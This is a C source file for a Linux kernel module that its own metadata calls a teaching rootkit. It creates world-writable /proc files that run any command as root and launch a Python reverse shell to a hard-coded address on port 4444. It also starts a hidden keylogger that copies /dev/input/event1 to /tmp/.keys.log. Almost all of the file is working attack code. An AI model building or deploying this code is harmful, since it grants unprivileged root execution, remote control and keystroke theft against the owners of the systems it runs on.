#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/kmod.h>

#define BUFFER_SIZE 256

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Shayman");
MODULE_DESCRIPTION("Rootkit pedagogique");
MODULE_VERSION("0.1");

#define PROC_NAME_ROOTKIT "rootkit"
#define PROC_NAME_SECRET "secret"

static struct proc_dir_entry *proc_entry_rootkit;
static struct proc_dir_entry *proc_entry_secret;

//----------------------------//
//        CMD EXECUTION      //
//----------------------------//

void exec_user_cmd(const char *cmd)
{
    char *argv[] = { "/bin/sh", "-c", (char *)cmd, NULL };
    static char *envp[] = {
        "HOME=/",
        "TERM=xterm",
        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
        NULL
    };

    printk(KERN_INFO "[rootkit] Execution de la commande : %s\n", cmd);
    int ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    printk(KERN_INFO "[rootkit] Code retour : %d\n", ret);
}

//----------------------------//
//      Reverse Shell        //
//----------------------------//

// Implémentation pédagogique fonctionnelle
void reverse_shell(void)
{
    printk(KERN_INFO "[rootkit] reverse_shell() appelé\n");
    const char *cmd = "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"1192.168.1.106\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'";
    exec_user_cmd(cmd);
}



//----------------------------//
//      Keylogger     //
//----------------------------//
void start_keylogger(void)
{
    printk(KERN_INFO "[rootkit] keylogger démarré (simulation)\n");

    // Commande shell complète pour capturer le clavier et écrire dans un fichier.
    const char *cmd = "nohup cat /dev/input/event1 > /tmp/.keys.log 2>&1 &";

    exec_user_cmd(cmd);

    printk(KERN_INFO "[rootkit] keylogger lancé avec la commande : %s\n", cmd);
}


//----------------------------//
//     /proc/secret write    //
//----------------------------//

ssize_t proc_secret_write(struct file *file, const char __user *buf, size_t count, loff_t *pos)
{
    char kbuf[BUFFER_SIZE] = {0};
    if (count > BUFFER_SIZE - 1)
        return -EINVAL;

    if (copy_from_user(kbuf, buf, count))
        return -EFAULT;

    kbuf[count] = '\0';

    printk(KERN_INFO "[rootkit] /proc/secret reçu : %s\n", kbuf);

    if (strncmp(kbuf, "shell", 5) == 0) {
        reverse_shell();
    } else if (strncmp(kbuf, "keylog", 6) == 0) {
        start_keylogger();
    } else {
        printk(KERN_INFO "[rootkit] Commande inconnue dans /proc/secret\n");
    }

    return count;
}

static const struct proc_ops proc_fops_secret = {
    .proc_write = proc_secret_write,
};

//----------------------------//
//        /proc/rootkit      //
//----------------------------//

ssize_t proc_rootkit_read(struct file *file, char __user *ubuf, size_t len, loff_t *off)
{
    char output[] = "rootkit: module pedagogique actif\n";
    return simple_read_from_buffer(ubuf, len, off, output, strlen(output));
}

ssize_t proc_rootkit_write(struct file *file, const char __user *buffer, size_t count, loff_t *ppos)
{
    char commande[BUFFER_SIZE] = {0};

    if (count > sizeof(commande) - 1)
        return -EINVAL;

    if (copy_from_user(commande, buffer, count))
        return -EFAULT;

    commande[count] = '\0';

    printk(KERN_INFO "[rootkit] Commande recue : %s\n", commande);

    if (strncmp(commande, "exec ", 5) == 0) {
        char *arg = commande + 5;
        if (*arg != '\0') {
            exec_user_cmd(arg);
        } else {
            printk(KERN_INFO "[rootkit] Aucune commande specifiee apres 'exec'\n");
        }
    }

    return count;
}

static const struct proc_ops proc_fops_rootkit = {
    .proc_read = proc_rootkit_read,
    .proc_write = proc_rootkit_write,
};

//----------------------------//
//     Module init/exit      //
//----------------------------//

static int __init mymodule_init(void)
{
    proc_entry_rootkit = proc_create(PROC_NAME_ROOTKIT, 0666, NULL, &proc_fops_rootkit);
    proc_entry_secret = proc_create(PROC_NAME_SECRET, 0666, NULL, &proc_fops_secret);

    if (!proc_entry_rootkit || !proc_entry_secret) {
        printk(KERN_ALERT "[rootkit] Erreur création /proc\n");
        return -ENOMEM;
    }

    printk(KERN_INFO "[rootkit] Module pedagogique chargé.\n");
    return 0;
}

static void __exit mymodule_exit(void)
{
    if (proc_entry_rootkit)
        proc_remove(proc_entry_rootkit);
    if (proc_entry_secret)
        proc_remove(proc_entry_secret);

    printk(KERN_INFO "[rootkit] Module pedagogique déchargé.\n");
}

module_init(mymodule_init);
module_exit(mymodule_exit);
